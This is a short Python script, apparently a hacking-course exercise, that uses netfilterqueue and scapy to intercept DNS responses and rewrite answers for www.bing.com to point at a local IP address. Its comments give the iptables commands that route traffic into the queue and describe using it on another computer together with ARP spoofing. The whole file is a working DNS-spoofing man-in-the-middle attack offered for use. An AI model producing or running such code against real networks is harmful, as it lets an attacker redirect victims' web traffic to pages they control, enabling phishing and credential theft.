#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

# iptables -I FORWARD -j NFQUEUE --queue-num 0 # for outside computer to test program (actual condition with arpspoofing)
# iptables -I OUTPUT -j NFQUEUE --queue-num 0 # for our local computer to test progran
# iptables -I INPUT -j NFQUEUE --queue-num 0 # for our local computer to test progran
# INPUT and OUTPUT chain is used for local system to test program
# iptables --flush # for reseting iptables

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] Spoofing...")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.43.56")
            scapy_packet[scapy.DNS].an = answer     
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    packet.accept()
    # packet.drop()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

